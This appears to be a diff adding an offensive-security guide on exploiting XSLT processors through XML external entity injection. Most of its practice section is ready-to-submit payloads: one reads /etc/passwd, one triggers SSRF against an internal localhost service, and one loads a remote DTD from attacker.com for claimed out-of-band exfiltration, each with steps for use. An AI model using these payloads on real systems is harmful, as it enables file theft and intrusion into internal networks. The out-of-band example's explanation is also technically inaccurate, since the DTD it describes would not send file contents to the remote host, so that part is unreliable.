@@ -1,0 +1,126 @@
+---
+title: Exploiting XSLT Processors via External Entity Injection
+description: Learn how to exploit XSLT processors through XXE to access files and
+  trigger SSRF attacks.
+keywords:
+- XSLT injection
+- external entity
+- XXE attacks
+- file read
+- SSRF
+- DTD inclusion
+- entity expansion
+- cybersecurity
+- XSLT processors
+---
+
+# External Entity
+
+## Context
+
+This guide aims to demonstrate the exploitation of XSLT processors through external entity injection to read files or trigger Server-Side Request Forgery (SSRF). It assumes familiarity with XML structure and parsing, the basics of XSLT processing, DTD (Document Type Definition), and general XSLT injection techniques.
+
+## Theory
+
+### External Entity Injection in XSLT Context
+
+External Entity (XXE) injection abuses XML parsers' ability to resolve external entities, enabling an attacker to read local files or perform SSRF attacks. XSLT processors can parse embedded DTDs, allowing attacker-supplied entity definitions to be executed. If an XSLT input is attacker-controlled and entity resolution is enabled, it can lead to unauthorized access to files and network resources.
+
+### Entity Declaration and Expansion Mechanics
+
+ENTITY declarations in DTDs define reusable values, which can reference local files or network resources. An attacker can inject ENTITY definitions, reference them in an XSLT transformation, and trigger unwanted file or network access. A lack of restrictions on entity resolution in XSLT processors exposes the file system and internal network services to attacks.
+
+### Parameter Entities and External DTD Inclusion
+
+Parameter entities can be leveraged to include external DTDs, which facilitates advanced attacks. Attackers can inject a parameter entity referencing a remote DTD that further defines malicious entities to enhance the initial attack vector.
+
+### Entity Expansion and Out-of-Band Exfiltration
+
+Through entity expansion, an attacker can exfiltrate file contents via error messages or network requests, known as Out-of-Band (OOB) attacks. For instance, defining an entity to reference a file and using it in a URL can result in unauthorized data retrieval.
+
+## Practice
+
+### File Read via External Entity Injection in XSLT
+
+- **Payload:**
+  
+  ```xml
+  <?xml version="1.0"?>
+  <!DOCTYPE xsl:stylesheet [
+    <!ENTITY ext_file SYSTEM "file:///etc/passwd">
+  ]>
+  <xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
+    <xsl:template match="/">
+      <xsl:value-of select="'&ext_file;'"/>
+    </xsl:template>
+  </xsl:stylesheet>
+  ```
+
+  This payload injects an ENTITY to read the `/etc/passwd` file and outputs its contents via XSLT transformation.
+
+- **Execution:**
+  - Submit the payload as an XSLT input to the vulnerable application.
+  - Observe the application response for contents of the file.
+
+- **Outcome:**
+
+  The attacker reads arbitrary files from the server through XSLT entity expansion.
+
+### SSRF via External Entity in XSLT
+
+- **Payload:**
+
+  ```xml
+  <?xml version="1.0"?>
+  <!DOCTYPE xsl:stylesheet [
+    <!ENTITY ext_url SYSTEM "http://localhost:8080/internal">
+  ]>
+  <xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
+    <xsl:template match="/">
+      <xsl:value-of select="'&ext_url;'"/>
+    </xsl:template>
+  </xsl:stylesheet>
+  ```
+
+  This payload defines an ENTITY referencing an internal HTTP service, triggering SSRF when expanded.
+
+- **Execution:**
+  - Submit the payload as an XSLT input to the vulnerable application.
+  - Monitor the internal service for requests or observe the application response.
+
+- **Outcome:**
+
+  The attacker triggers SSRF to internal resources via XSLT entity expansion.
+
+### Out-of-Band Exfiltration via Parameter Entity and External DTD
+
+- **Payload:**
+
+  ```xml
+  <?xml version="1.0"?>
+  <!DOCTYPE xsl:stylesheet [
+    <!ENTITY % ext SYSTEM "http://attacker.com/malicious.dtd">
+    %ext;
+  ]>
+  <xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
+    <xsl:template match="/">
+      <xsl:value-of select="'&exfil;'"/>
+    </xsl:template>
+  </xsl:stylesheet>
+  ```
+
+  This payload loads an external DTD from an attacker-controlled server, which defines the `&exfil;` entity for OOB data theft.
+
+- **Execution:**
+  - Host `malicious.dtd` on `attacker.com` to define `ENTITY exfil SYSTEM "file:///etc/passwd"`.
+  - Submit the payload as XSLT input and monitor `attacker.com` for requests.
+
+- **Outcome:**
+
+  The attacker exfiltrates file contents to a remote server using OOB XXE in XSLT.
+
+## Tools
+
+- **Burp Suite**
+- **curl**
+- **nc**
